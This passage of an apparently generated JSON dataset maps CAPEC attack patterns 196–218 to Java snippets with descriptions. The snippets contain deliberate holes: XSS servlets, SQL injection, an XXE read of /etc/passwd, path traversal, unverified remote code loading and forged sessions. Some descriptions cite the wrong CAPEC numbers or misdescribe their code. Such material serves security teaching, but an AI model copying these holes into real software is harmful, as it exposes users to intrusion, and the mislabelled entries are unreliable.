        "description": "This Java code snippet demonstrates a weak authentication mechanism that is vulnerable to a Principal Spoof attack. The program prompts the user to enter a username and password, and then performs a simple authentication check. The authentication mechanism is weak because it only checks if the username is 'admin' and the password is 'password123', without any additional verification. This makes it easy for an adversary to spoof the identity of the 'admin' user by simply entering these credentials. This example embodies the main idea of the CAPEC by showing how an adversary can pretend to be another person (the 'admin' user) due to weak authentication (CWE-1390) and lack of proper identity verification (CWE-322)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SessionManager {\n    private static Map<String, String> sessionStore = new HashMap<>();\n\n    public static String createSession(String username) {\n        // Weak session ID generation\n        String sessionId = Base64.getEncoder().encodeToString((username + System.currentTimeMillis()).getBytes());\n        sessionStore.put(sessionId, username);\n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        // No expiration check\n        return sessionStore.containsKey(sessionId);\n    }\n\n    public static void main(String[] args) {\n        String sessionId = createSession(\"user1\");\n        System.out.println(\"Session ID: \" + sessionId);\n\n        // Simulate an attacker forging a session ID\n        String forgedSessionId = Base64.getEncoder().encodeToString((\"user1\" + (System.currentTimeMillis() - 10000)).getBytes());\n        System.out.println(\"Forged Session ID: \" + forgedSessionId);\n\n        // Validate the forged session ID\n        if (validateSession(forgedSessionId)) {\n            System.out.println(\"Forged session validated successfully.\");\n        } else {\n            System.out.println(\"Forged session validation failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session management system that embodies the main idea of CAPEC-Session Credential Falsification through Forging. The `createSession` method generates a weak session ID by encoding the username and current timestamp using Base64. This session ID is then stored in a simple in-memory map. The `validateSession` method checks if the session ID exists in the map without any expiration check, making it susceptible to session fixation (CWE-384) and insufficient session expiration (CWE-613). The `main` method simulates an attacker forging a session ID by manipulating the timestamp, demonstrating how an attacker could potentially gain unauthorized access by creating a valid-looking session ID. This code highlights the risks associated with weak session ID generation and improper session management."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExponentialDataExpansion {\n    public static void main(String[] args) {\n        List<Object> data = new ArrayList<>();\n        expandData(data, 0);\n    }\n\n    private static void expandData(List<Object> data, int depth) {\n        if (depth > 10) return; // Limit recursion depth to prevent excessive resource allocation\n        List<Object> nestedData = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            nestedData.add(new ArrayList<>(data));\n        }\n        data.add(nestedData);\n        expandData(nestedData, depth + 1);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of Exponential Data Expansion. The `expandData` method recursively creates nested lists, which can lead to exponential growth in memory usage. The recursion depth is limited to prevent excessive resource allocation, addressing CWE-770 (Allocation of Resources Without Limits or Throttling). The nested structure represents CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements) and CWE-1093 (Excessively Complex Data Representation). The code highlights the potential for exponential data expansion and the importance of limiting recursion to prevent resource exhaustion."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String errorMessage = request.getParameter(\"error\");\n        if (errorMessage == null) {\n            errorMessage = \"Unknown error occurred.\";\n        }\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Error Page</h1>\");\n        response.getWriter().println(\"<p>\" + errorMessage + \"</p>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to XSS attacks targeting error pages. The servlet retrieves an 'error' parameter from the HTTP request and directly includes it in the HTML response without proper sanitization. This can lead to an XSS vulnerability if an attacker crafts a URL with a malicious script in the 'error' parameter. The code embodies the main idea of CAPEC-81 and related CWEs by showing how improper neutralization of input in an error message can lead to XSS attacks."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Incomplete denylist: only checks for lowercase 'script'\n        if (userInput != null && !userInput.contains(\"<script>\")) {\n            response.getWriter().println(\"User input: \" + userInput);\n        } else {\n            response.getWriter().println(\"Invalid input detected.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to XSS attacks using alternate syntax. The code retrieves a user input parameter and checks if it contains the string '<script>'. However, this check is case-sensitive and does not account for alternate forms like '<Script>' or '<ScRiPt>', which can bypass the filter. This incomplete denylist approach (CWE-692) and improper neutralization of alternate XSS syntax (CWE-87) can lead to the execution of malicious scripts. The code snippet highlights the importance of comprehensive input validation and neutralization to prevent XSS attacks."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"1 OR 1=1\"; // Simulated user input\n        String query = \"SELECT * FROM users WHERE id = \" + userInput;\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SQL Injection vulnerability, which is a common result of improper input validation (CWE-20) and improper neutralization of special elements (CWE-74). The code constructs a SQL query by directly concatenating user input without any filtering or validation. This allows an attacker to manipulate the query by injecting SQL code, as shown with the input '1 OR 1=1'. This input will cause the query to return all rows from the 'users' table, bypassing any intended access controls. The code represents the main idea of the CAPEC by showing how the removal or absence of input filters can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import java.io.*;\nimport javax.xml.parsers.*;\nimport org.w3c.dom.*;\nimport org.xml.sax.SAXException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY ext SYSTEM \\\"file:///etc/passwd\\\">]><root>&ext;</root>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            InputStream is = new ByteArrayInputStream(xmlData.getBytes());\n            Document doc = db.parse(is);\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code parses an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration with an external entity that references the local file '/etc/passwd'. The DocumentBuilderFactory and DocumentBuilder are used to parse the XML without disabling external entity processing, which can lead to the inclusion of external data in the parsed output. This represents CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data). The vulnerability allows an attacker to access sensitive files on the system, demonstrating the risk of including functionality from an untrusted control sphere (CWE-829)."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousClient {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"localhost\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Bypassing client-side authentication\n            out.println(\"AUTHENTICATE user=admin&password=wrongpassword\");\n\n            // Sending malicious payload\n            out.println(\"<script>alert('Hacked!');</script>\");\n\n            // Reading server response\n            String response;\n            while ((response = in.readLine()) != null) {\n                System.out.println(\"Server: \" + response);\n            }\n\n            // Closing resources\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a malicious client that connects to a server on localhost at port 8080. The client attempts to bypass client-side authentication by sending incorrect credentials. It then sends a malicious payload (an XSS script) to the server. This code embodies the main idea of the CAPEC 'Create Malicious Client' by violating the server's assumptions about client behavior. The related CWEs are demonstrated as follows: CWE-603 (Use of Client-Side Authentication) is shown by bypassing authentication, CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) are represented by sending a malicious script, and CWE-602 (Client-Side Enforcement of Server-Side Security) is implied by the server's reliance on the client to follow security protocols."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        // Obtain a reference to the system node of the registry\n        Preferences systemRoot = Preferences.systemRoot();\n        String key = \"com.example.app.config\";\n        String value = \"sensitiveData\";\n\n        // Store sensitive information in cleartext (CWE-314)\n        systemRoot.put(key, value);\n        System.out.println(\"Registry key set: \" + key + \" = \" + value);\n\n        // External control of system setting (CWE-15)\n        String retrievedValue = systemRoot.get(key, \"default\");\n        System.out.println(\"Retrieved registry key: \" + key + \" = \" + retrievedValue);\n\n        // Improper prevention of lock bit modification (CWE-1231)\n        // Simulating lock bit modification vulnerability\n        boolean lockBit = false; // Initially unlocked\n        if (!lockBit) {\n            systemRoot.put(key, \"modifiedData\");\n            System.out.println(\"Registry key modified: \" + key + \" = modifiedData\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the manipulation of registry information, embodying the main idea of the CAPEC. The code uses the Preferences API to interact with the system registry. It stores sensitive information in cleartext (CWE-314), which is a vulnerability. The code also shows how an external actor can control system settings (CWE-15) by retrieving and modifying registry values. Additionally, it simulates a scenario where a lock bit intended to protect registry modifications is not properly enforced (CWE-1231), allowing unauthorized changes to the registry. This example highlights the potential risks and vulnerabilities associated with improper handling of registry information."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class SensitiveDataCache {\n    private Map<String, String> cache = new HashMap<>();\n\n    public void storeSensitiveData(String key, String value) {\n        // Storing sensitive data in cache without encryption\n        cache.put(key, value);\n    }\n\n    public String retrieveSensitiveData(String key) {\n        // Retrieving sensitive data from cache\n        return cache.get(key);\n    }\n\n    public static void main(String[] args) {\n        SensitiveDataCache sensitiveDataCache = new SensitiveDataCache();\n        sensitiveDataCache.storeSensitiveData(\"password\", \"mySecretPassword\");\n        System.out.println(\"Retrieved: \" + sensitiveDataCache.retrieveSensitiveData(\"password\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache implementation that stores and retrieves sensitive data without any encryption or protection. The `SensitiveDataCache` class uses a `HashMap` to store sensitive information, such as passwords, in plain text. This embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, as it shows how sensitive data can be stored in a cache without proper security measures. The code is vulnerable to CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data), as it does not encrypt the sensitive data before storing it in the cache. An attacker who gains access to the cache can easily retrieve the sensitive information."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "public class VulnerableApp {\n    private static final String EMBEDDED_KEY = \"s3cr3tK3y\";\n\n    public static void main(String[] args) {\n        // Simulate authentication using embedded key\n        if (authenticateClient(EMBEDDED_KEY)) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n    }\n\n    private static boolean authenticateClient(String key) {\n        // Insecure client-side authentication\n        return \"s3cr3tK3y\".equals(key);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application where sensitive data, specifically an authentication key, is embedded directly within the client-side code. The `EMBEDDED_KEY` is hardcoded and used for client-side authentication in the `authenticateClient` method. This represents the main idea of CAPEC-37: Retrieve Embedded Sensitive Data. The related CWEs provide additional context: CWE-522 (Insufficiently Protected Credentials) is illustrated by the hardcoded key, CWE-603 (Use of Client-Side Authentication) is shown by the authentication logic being performed on the client side, and CWE-294 (Authentication Bypass by Capture-replay) is implied as the key could be intercepted and reused by an attacker."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.security.KeyStore;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class MaliciousCodeSigner {\n    private static final String KEYSTORE_PATH = \"keystore.jks\"; // CWE-798: Hard-coded credentials\n    private static final String KEYSTORE_PASSWORD = \"password\"; // CWE-798: Hard-coded credentials\n    private static final String ALIAS = \"mykey\";\n    private static final String SIGNATURE_ALGORITHM = \"SHA256withRSA\";\n\n    public static void main(String[] args) throws Exception {\n        // Load the keystore\n        KeyStore keystore = KeyStore.getInstance(KeyStore.getDefaultType());\n        keystore.load(Files.newInputStream(Paths.get(KEYSTORE_PATH)), KEYSTORE_PASSWORD.toCharArray());\n\n        // Extract the private key\n        PrivateKey privateKey = (PrivateKey) keystore.getKey(ALIAS, KEYSTORE_PASSWORD.toCharArray());\n\n        // Malicious code to be signed\n        String maliciousCode = \"System.out.println(\\\"Executing malicious code!\\\");\"; // CWE-506: Embedded Malicious Code\n\n        // Sign the malicious code\n        Signature signature = Signature.getInstance(SIGNATURE_ALGORITHM);\n        signature.initSign(privateKey);\n        signature.update(maliciousCode.getBytes());\n        byte[] signedData = signature.sign();\n\n        // Encode the signed data in Base64\n        String signedCode = Base64.getEncoder().encodeToString(signedData);\n\n        // Output the signed malicious code\n        System.out.println(\"Signed Malicious Code: \" + signedCode);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC). The code loads a keystore containing a private key (CWE-798: Use of Hard-coded Credentials), extracts the private key, and uses it to sign a piece of malicious code (CWE-506: Embedded Malicious Code). The signed malicious code is then outputted in Base64 format. This represents how an adversary could use extracted signing credentials to sign malicious content, making it appear legitimate to users or tools that verify the signature."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableClient {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/remoteCode.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"remoteCode.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading and executing the downloaded code (CWE-829)\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:remoteCode.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"RemoteCode\");\n            Runnable instance = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            instance.run();\n\n            // Client-side authentication (CWE-603)\n            if (authenticateClient(\"username\", \"password\")) {\n                System.out.println(\"Client authenticated.\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Client-side authentication method\n    private static boolean authenticateClient(String username, String password) {\n        // Insecure: Authentication logic on the client side\n        return \"username\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Removing Important Client Functionality'. The code downloads and executes a remote JAR file without verifying its integrity (CWE-494 and CWE-829), which could allow an attacker to inject malicious code. Additionally, it performs client-side authentication (CWE-603), which can be easily bypassed if the client is modified. This setup represents a scenario where the server relies on the client to enforce security mechanisms, making it susceptible to attacks if the client is compromised or altered."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "public class ShoppingCart {\n    private double totalCost = 0.0;\n\n    public void addItem(double price, int quantity) {\n        // Client-side calculation of total cost\n        totalCost += price * quantity;\n    }\n\n    public double getTotalCost() {\n        return totalCost;\n    }\n\n    public static void main(String[] args) {\n        ShoppingCart cart = new ShoppingCart();\n        cart.addItem(100.0, 2); // Adding 2 items, each costing 100.0\n        System.out.println(\"Total Cost: \" + cart.getTotalCost());\n    }\n}",
        "description": "This Java code snippet represents a vulnerable implementation of a shopping cart where the total cost is calculated on the client side. The `addItem` method takes the price and quantity of an item and updates the `totalCost` by multiplying them. The `getTotalCost` method returns the total cost. This design is vulnerable because an attacker can modify the client-side logic to manipulate the total cost calculation, leading to incorrect billing. For example, an attacker could change the price or quantity before sending the total cost to the server, exploiting the reliance on client-side enforcement of server-side security (CWE-602) and incorrect calculation (CWE-682)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/upload\")\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n        String mimeType = request.getParameter(\"mimeType\");\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileName.endsWith(\".txt\")) {\n            response.setContentType(\"text/plain\");\n        } else if (fileName.endsWith(\".html\")) {\n            response.setContentType(\"text/html\");\n        } else {\n            response.setContentType(mimeType);\n        }\n\n        // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n        response.getWriter().write(fileContent);\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a vulnerability where an adversary can exploit MIME type mismatches to execute scripts. The servlet handles file uploads and sets the MIME type based on the file extension or a provided MIME type. If an attacker uploads a file with a misleading extension or MIME type, the browser might misinterpret the content and execute scripts, leading to XSS attacks. The code does not properly validate or sanitize the file content, making it susceptible to CWE-79 (XSS) and CWE-646 (Reliance on File Name or Extension)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String imgTag = \"<img src='\" + userInput + \"' />\";\n        response.getWriter().println(\"<html><body>\" + imgTag + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC and CWEs provided. The servlet takes user input from a request parameter and directly inserts it into an HTML IMG tag without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks (CWE-79, CWE-82) because an attacker can inject malicious scripts through the 'input' parameter. The code also lacks proper error handling and custom error pages (CWE-7), which could expose sensitive information if an error occurs. This snippet embodies the idea of leveraging web tools to change application behavior by exploiting these vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MisuseFunctionality {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            File sensitiveFile = new File(\"/etc/passwd\");\n            Scanner fileReader = new Scanner(sensitiveFile);\n            StringBuilder fileContent = new StringBuilder();\n            while (fileReader.hasNextLine()) {\n                fileContent.append(fileReader.nextLine()).append(\"\\n\");\n            }\n            fileReader.close();\n\n            // CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n            // Undocumented feature: writing sensitive data to a public file\n            File publicFile = new File(\"/tmp/public_info.txt\");\n            FileWriter fileWriter = new FileWriter(publicFile);\n            fileWriter.write(fileContent.toString());\n            fileWriter.close();\n\n            System.out.println(\"Sensitive data has been written to /tmp/public_info.txt\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misuse of functionality by leveraging legitimate file reading and writing capabilities to expose sensitive system information. The code reads the contents of the '/etc/passwd' file, which contains sensitive system information, and writes it to a publicly accessible file '/tmp/public_info.txt'. This represents CAPEC's idea of using legitimate functionality in an unintended way to achieve a negative impact. The code also touches on CWE-497 by exposing sensitive system information and CWE-1242 by including an undocumented feature that writes sensitive data to a public file."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class PathTraversalServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filename = request.getParameter(\"file\");\n        String basePath = \"/var/www/uploads/\";\n        File file = new File(basePath + filename);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setContentLength((int) file.length());\n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a path traversal vulnerability. The servlet reads a 'file' parameter from the HTTP request and constructs a file path by concatenating a base directory path with the user-provided filename. This approach is vulnerable to path traversal attacks, as an attacker can manipulate the 'file' parameter to include sequences like '/../' or '.../...//' to access files outside the intended directory. The code does not properly neutralize these sequences, allowing an attacker to potentially access sensitive files on the server."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        try {\n            // Direct use of sockets (CWE-246)\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            // Simulate some processing\n            clientSocket.getOutputStream().write(\"Hello, World!\".getBytes());\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            // Missing custom error page (CWE-7)\n            response.getWriter().write(\"Error: \" + e.getMessage());\n            e.printStackTrace(); // Information exposure through debug log files (CWE-532)\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable servlet that embodies the main idea of the deprecated CAPEC for fuzzing to garner J2EE/.NET-based stack traces for application mapping. The code directly uses sockets (CWE-246), which is a bad practice in J2EE applications. It also lacks a custom error page (CWE-7), displaying sensitive information directly to the user. Additionally, it exposes information through debug log files (CWE-532) by printing the stack trace. This combination of issues can be exploited by attackers to gather information about the application's structure and behavior."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class FuzzingExample {\n    private static final Logger logger = Logger.getLogger(FuzzingExample.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"app.log\", true);\n            fh.setFormatter(new SimpleFormatter());\n            logger.addHandler(fh);\n\n            String input = args.length > 0 ? args[0] : \"\";\n            processInput(input);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processInput(String input) {\n        try {\n            if (input.equals(\"\")) {\n                throw new IllegalArgumentException(\"Input cannot be empty\");\n            }\n            // Simulate processing input\n            logger.info(\"Processing input: \" + input);\n        } catch (IllegalArgumentException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple application that processes input and logs error messages. The main idea is to show how an application can be vulnerable to fuzzing attacks by generating and logging error messages that may contain sensitive information. The `processInput` method throws an `IllegalArgumentException` if the input is empty, and this exception is caught and logged with a severe level. The log file (`app.log`) can be examined by an attacker to gather information about the application's behavior and potential vulnerabilities. This example embodies the CAPEC concept of fuzzing for application mapping and highlights related CWEs such as the generation of error messages containing sensitive information (CWE-209) and the insertion of sensitive information into log files (CWE-532)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // No authentication for critical function (CWE-306)\n                if (inputLine.equals(\"SHUTDOWN\")) {\n                    System.out.println(\"Shutting down server...\");\n                    break;\n                }\n                // No integrity check (CWE-924)\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n            serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel. It sets up a simple server that listens for incoming connections on port 8080. The server reads input from the client and echoes it back without performing any authentication (CWE-306) or integrity checks (CWE-924). Additionally, the server can be shut down by sending the 'SHUTDOWN' command, which is a critical function that lacks authentication. This code embodies the main idea of CAPEC-272 (Communication Channel Manipulation) by showing how an adversary could manipulate the communication channel to compromise its security, leading to potential information exposure, unauthorized actions, and system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\npublic class VulnerableSSLClient {\n    public static void main(String[] args) {\n        String host = \"example.com\";\n        int port = 443;\n        try {\n            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n            SSLSocket socket = (SSLSocket) factory.createSocket(host, port);\n            socket.startHandshake();\n\n            // Send sensitive data without proper encryption\n            OutputStream out = socket.getOutputStream();\n            String sensitiveData = \"username=admin&password=admin123\";\n            out.write(sensitiveData.getBytes());\n            out.flush();\n\n            // Read response\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            System.out.println(\"Response: \" + new String(buffer, 0, bytesRead));\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable SSL/TLS client that connects to a server and sends sensitive data without proper encryption and verification. The code uses `SSLSocketFactory` to create an SSL socket and initiates a handshake with the server. However, it does not verify the server's certificate, making it susceptible to man-in-the-middle attacks (CWE-294, CWE-923, CWE-940). Additionally, it sends sensitive information (username and password) over the connection without ensuring it is properly encrypted (CWE-201). This embodies the main idea of the CAPEC by showing how an adversary can exploit incorrectly configured SSL/TLS communications to access or manipulate sensitive data."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.ParserConfigurationException;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\nimport org.xml.sax.SAXException;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class UDDISpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML from an untrusted source\n            File inputFile = new File(\"untrusted.xml\");\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(inputFile);\n            doc.getDocumentElement().normalize();\n\n            // Missing XML validation (CWE-112)\n            // Insufficient verification of data authenticity (CWE-345)\n            String businessName = doc.getElementsByTagName(\"businessName\").item(0).getTextContent();\n            String wsdlURL = doc.getElementsByTagName(\"wsdlURL\").item(0).getTextContent();\n\n            // Incorrectly specified destination in a communication channel (CWE-941)\n            URL url = new URL(wsdlURL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Improper enforcement of message integrity during transmission (CWE-924)\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Connected to: \" + businessName);\n            } else {\n                System.out.println(\"Failed to connect to: \" + businessName);\n            }\n\n            // Channel accessible by non-endpoint (CWE-300)\n            // No verification of the endpoint identity\n        } catch (ParserConfigurationException | SAXException | 